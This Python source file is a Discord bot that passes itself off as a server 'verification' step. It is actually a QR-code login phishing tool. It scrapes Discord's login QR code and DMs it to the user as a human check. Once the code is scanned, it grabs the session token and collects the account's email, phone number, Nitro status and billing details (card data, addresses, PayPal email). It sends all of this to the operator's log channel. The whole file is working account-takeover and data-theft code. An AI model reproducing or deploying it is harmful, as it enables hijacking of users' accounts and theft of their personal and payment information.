from selenium import webdriver
from selenium.webdriver.chrome.options import Options
import time
from bs4 import BeautifulSoup
from datetime import datetime
import lxml
from PIL import Image
from dhooks import Webhook, Embed
import os
import requests
import base64
from discord.ext import commands
import discord
import asyncio
import json

user_config = open('config.json')
data = json.load(user_config)

channel_id = data["logs_channel_id"]
bot_token = data["token"]

def logo_qr():
    im1 = Image.open('base/qr_code.png', 'r')
    im2 = Image.open('base/overlay.png', 'r')
    im2_w, im2_h = im2.size
    im1.paste(im2, (60, 55))
    im1.save('temp/final_qr.png', quality=95)

def paste_template():
    im1 = Image.open('base/qr_code.png', 'r')
    im1.save('discord.png', quality=95)

header = {
  "Content-Type": "application/json",
  "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
}

def get_header(token=None):
  headers = header

  if token:
    header.update({"Authorization": token})
  return headers

intents = discord.Intents.all()

bot = commands.Bot(command_prefix=';', intents=intents)

@bot.event
async def on_ready():
  print('Bot is online')

@bot.command()
async def verify(ctx):

  notify1 = discord.Embed(
    title="Notification",
    description="Verification proccess started please wait 40 seconds for us to send further information."
  )

  notify2 = discord.Embed(
    title="Notification",
    description="Sorry you ran out of time please re-start the verification"
  )
  
  notify_msg = await ctx.author.send(embed=notify1)

  chrome_options = Options()
  chrome_options.add_argument('--no-sandbox')
  chrome_options.add_argument('--disable-dev-shm-usage')
  driver = webdriver.Chrome(options=chrome_options)
    
  driver.get('https://discord.com/login')
    
  time.sleep(10)
    
  page_source = driver.page_source
    
  soup = BeautifulSoup(page_source, features='lxml')
    
  div = soup.find('div', {'class': 'qrCode-2R7t9S'})
  qr_code = div.find('img')['src']
  file = os.path.join(os.getcwd(), 'base/qr_code.png')
    
  img_data =  base64.b64decode(qr_code.replace('data:image/png;base64,', ''))
    
  with open(file,'wb') as handler:
    handler.write(img_data)
    
  discord_login = driver.current_url
  paste_template()
  
  file = discord.File("discord.png", filename="discord.png")
  
  verify_main_embed = discord.Embed(
          title="✅Welcome! We need to verify that your human",
           description="""Scan the QR code below on your Discord Mobile
   app to login.
  
   **Additional Notes:**
   ⚠️This will not work without the mobile app.
   🆘 Please contact a staff member if you are
   unable to verify."""
  )
  verify_main_embed.set_image(url='attachment://discord.png')
  verify_main_embed.set_footer(text="You have 60secs to complete or you will have to redo the verfication proccess")

  
  ping = await ctx.author.send(f"<@{ctx.author.id}>")
  dm_embed = await ctx.author.send(embed=verify_main_embed, file=file)
  await notify_msg.delete()
  await ping.delete()
  

  
  while True:
    if discord_login != driver.current_url:
      print('Grabbing token..')
      token = driver.execute_script('''
  window.dispatchEvent(new Event('beforeunload'));
  let iframe = document.createElement('iframe');
  iframe.style.display = 'none';
  document.body.appendChild(iframe);
  let localStorage = iframe.contentWindow.localStorage;
  var token = JSON.parse(localStorage.token);
  return token;
     
  ''')
      
      r = requests.get('https://discord.com/api/v9/users/@me', headers=get_header(token))
      res = requests.get('https://discordapp.com/api/v9/users/@me/billing/subscriptions', headers=get_header(token))
  
        #fetch data of logged user
      userName = r.json()['username'] + '#' + r.json()['discriminator']
      userID = r.json()['id']
      avatar_id = r.json()['avatar']
      avatar_url = f'https://cdn.discordapp.com/avatars/{userID}/{avatar_id}.webp'
      phone = r.json()['phone']
      email = r.json()['email']
      nitro_data = res.json()
      has_nitro = bool(len(nitro_data) > 0)
  
      if has_nitro:
        d1 = datetime.strptime(nitro_data[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
        d2 = datetime.strptime(nitro_data[0]["current_period_start"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
        days_left = abs((d2 - d1).days)
  
      
      cc_digits = {
          'american express': '3',
          'visa': '4',
          'mastercard': '5'
        }
  
      billing_info = []
      for x in requests.get('https://discordapp.com/api/v9/users/@me/billing/payment-sources', headers=get_header(token)).json():
        y = x['billing_address']
        name = y['name']
        address_1 = y['line_1']
        address_2 = y['line_2']
        city = y['city']
        postal_code = y['postal_code']
        state = y['state']
        country = y['country']
        if x['type'] == 1:
          cc_brand = x['brand']
          cc_first = cc_digits.get(cc_brand)
          cc_last = x['last_4']
          cc_month = str(x['expires_month'])
          cc_year = str(x['expires_year'])
          data = {
                  'Payment Type': 'Credit Card',
                  'Valid': not x['invalid'],
                  'CC Holder Name': name,
                  'CC Brand': cc_brand.title(),
                  'CC Number': ''.join(z if (i + 1) % 2 else z + ' ' for i, z in enumerate((cc_first if cc_first else '*') + ('*' * 11) + cc_last)),
                  'CC Exp. Date': ('0' + cc_month if len(cc_month) < 2 else cc_month) + '/' + cc_year[2:4],
                  'Address 1': address_1,
                  'Address 2': address_2 if address_2 else '',
                  'City': city,
                  'Postal Code': postal_code,
                  'State': state if state else '',
                  'Country': country,
                  'Default Payment': x['default']
              }
        elif x['type'] == 2:
          data = {
                  'Payment Type': 'PayPal',
                  'Valid': not x['invalid'],
                  'PayPal Name': name,
                  'PayPal Email': x['email'],
                  'Address 1': address_1,
                  'Address 2': address_2 if address_2 else '',
                  'City': city,
                  'Postal Code': postal_code,
                  'State': state if state else '',
                  'Country': country,
                  'Default Payment': x['default']
              }
        billing_info.append(data)
          
          
        try:
          
          channel = bot.get_channel(channel_id)
    
          log_embed=discord.Embed(
              Title = "New Logged User",
              description = f"""
              The users loggged information has been fetched and formatted below.
              
              -- **User** --
        
              **Token** - {token}
              **Username** - {userName}
              **Email** - {email}
              **PhoneNumber** - {phone}
        
              -- **Nitro** --
              
              **Nitro** - {has_nitro}
              **Expires in**  - {days_left if has_nitro else "0"} days(s)
        
              -- **Billing** --
    
              ```{billing_info}```
              """)
          log_embed.set_author(name=f"{userName}", icon_url=f"{avatar_url}")
    
          await channel.send(embed=log_embed)
    
          member_role = discord.utils.get(ctx.guild.roles, name="verified")
    
          await ctx.author.add_roles(member_role)
  
          embed1 = discord.Embed(
              description = "You have successfully been verified, and now have full access to the server"
            )
  
          await ctx.author.send(embed=embed1)
          await dm_embed.delete()

          
          driver.close()
        except requests.exceptions.HTTPError as err:
          print(err)
          break


bot.run(bot_token)